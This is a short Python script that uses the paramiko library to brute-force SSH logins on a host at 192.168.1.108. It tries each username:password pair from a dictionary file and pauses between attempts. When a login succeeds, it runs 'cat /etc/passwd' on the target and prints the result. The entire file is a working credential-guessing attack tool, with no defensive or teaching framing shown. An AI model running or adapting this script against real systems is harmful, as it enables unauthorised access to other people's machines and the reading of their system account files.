import paramiko
import time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open('attacker_dictionary.txt','r')
# The file should in "username:password" file format

def attack(user,passes):
    try:
        if (ssh.connect('192.168.1.108',username=user,password=passes) is None):
            print("Username is: " + username, "Password is: " + password)
            stdin,stdout,stderr = ssh.exec_command('cat /etc/passwd')
            for line in stdout.readlines():
                print(line)
            ssh.close()
    except:
        print("Username: " + user + ",Password: " + passes + " is wrong, checking next")
        ssh.close()

# for loop to iterate all the username and password combinations in the attacker_dictionary.txt file
for lines in f:
    username = lines.split(':')[0]
    password = lines.split(':')[1].strip('\n')
    attack(username,password)
    time.sleep(1)
